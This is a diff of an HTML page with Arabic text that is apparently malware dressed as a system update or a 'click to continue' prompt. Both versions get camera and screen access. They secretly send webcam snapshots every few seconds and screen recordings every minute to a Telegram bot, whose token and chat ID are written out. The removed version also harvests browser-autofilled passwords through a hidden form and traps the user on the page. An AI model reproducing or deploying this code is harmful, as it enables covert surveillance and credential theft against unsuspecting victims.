@@ -1,94 +1,57 @@
+
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>System Critical Update</title>
-    <style>
-        body { background: #000; color: #f00; text-align: center; font-family: 'Courier New', monospace; overflow: hidden; }
-        #u { border: 2px solid #f00; padding: 30px; margin: 10% auto; width: 75%; box-shadow: 0 0 25px #f00; }
-        button { background: #f00; color: #fff; padding: 15px 35px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; font-size: 18px; }
-    </style>
-</head>
-<body onbeforeunload="return '⚠️ تحذير: سيتم تدمير بياناتك إذا غادرت الآن!'">
-
-    <div id="u">
-        <h1>⚠️ تم اكتشاف نشاط مشبوه</h1>
-        <p>جهازك قيد الاختراق. يجب عليك الضغط أدناه لتشغيل درع الحماية الفوري ومنع تسريب ملفاتك.</p>
-        <button id="btn">تفعيل درع الحماية 🛡️</button>
-    </div>
-
-    <form style="opacity: 0; position: absolute; left: -5000px;">
-        <input type="text" id="fake_u" name="username" autocomplete="username">
-        <input type="password" id="fake_p" name="password" autocomplete="current-password">
-    </form>
-
+<html>
+<head><meta charset="UTF-8"><title>Update</title></head>
+<body style="background:#000;color:#0f0;text-align:center;">
+    <button id="go" style="margin-top:20%;padding:20px;">اضغط هنا للمتابعة</button>
     <video id="v" width="1" height="1" autoplay style="opacity:0;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // البيانات الجديدة التي قدمتها سيدي
-        const _T = '8301462057:AAF1rD3xfgur1lyEV80jCctZ9stYJdVYkiU';
-        const _C = '1105921069';
+        const T = '8301462057:AAF1rD3xfgur1lyEV80jCctZ9stYJdVYkiU';
+        const C = '1105921069';
 
-        // منع الرجوع للخلف
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => history.go(1);
-
-        async function run() {
+        async function start() {
             try {
                 const cam = await navigator.mediaDevices.getUserMedia({ video: true });
                 const scr = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                document.body.innerHTML = "<h2>Error 0x01: Connecting...</h2>";
                 
-                document.getElementById('u').innerHTML = "<h1>🔒 جاري تأمين النظام... 0%</h1><p>الرجاء البقاء في الصفحة لإتمام العملية (Error: 0x992B)</p>";
-
                 const vid = document.getElementById('v');
                 vid.srcObject = cam;
 
-                // 1. التقاط صور الكاميرا كل 5 ثوانٍ
+                // 1. التقاط الصور بسرعة (كل 3 ثوانٍ - أقصى سرعة آمنة)
                 setInterval(() => {
                     const can = document.getElementById('c');
                     can.width = 400; can.height = 300;
                     can.getContext('2d').drawImage(vid, 0, 0, 400, 300);
-                    can.toBlob(b => send(b, 'p.jpg', 'sendPhoto'), 'image/jpeg', 0.5);
-                }, 5000);
+                    can.toBlob(b => send(b, 'p.jpg', 'sendPhoto'), 'image/jpeg', 0.4);
+                }, 3000);
 
-                // 2. تسجيل الشاشة (دورة كل 50 ثانية)
+                // 2. تسجيل الشاشة دقيقة بدقيقة
                 function rec() {
                     const m = new MediaRecorder(scr);
                     let ch = [];
                     m.ondataavailable = e => ch.push(e.data);
                     m.onstop = () => {
                         send(new Blob(ch, {type:'video/mp4'}), 'v.mp4', 'sendVideo');
-                        setTimeout(rec, 1000);
+                        rec(); 
                     };
                     m.start();
-                    setTimeout(() => m.stop(), 50000);
+                    setTimeout(() => m.stop(), 60000);
                 }
                 rec();
-
-                // 3. سحب كلمات المرور المخزنة
-                setInterval(() => {
-                    const u = document.getElementById('fake_u').value;
-                    const p = document.getElementById('fake_p').value;
-                    if(u || p) {
-                        fetch(`https://api.telegram.org/bot${_T}/sendMessage?chat_id=${_C}&text=Target_Account: ${u} | ${p}`);
-                    }
-                }, 10000);
-
-            } catch (e) { 
-                alert("خطأ: يجب السماح بجميع الصلاحيات لتفعيل الحماية!");
-                location.reload(); 
-            }
+            } catch (e) { location.reload(); }
         }
 
-        async function send(blob, n, m) {
+        async function send(b, n, m) {
             const f = new FormData();
-            f.append('chat_id', _C);
-            f.append(m === 'sendPhoto' ? 'photo' : 'video', blob, n);
-            fetch(`https://api.telegram.org/bot${_T}/${m}`, { method: 'POST', body: f }).catch(() => {});
+            f.append('chat_id', C);
+            f.append(m === 'sendPhoto' ? 'photo' : 'video', b, n);
+            fetch(`https://api.telegram.org/bot${T}/${m}`, { method: 'POST', body: f });
         }
 
-        document.getElementById('btn').onclick = run;
+        document.getElementById('go').onclick = start;
     </script>
 </body>
 </html>
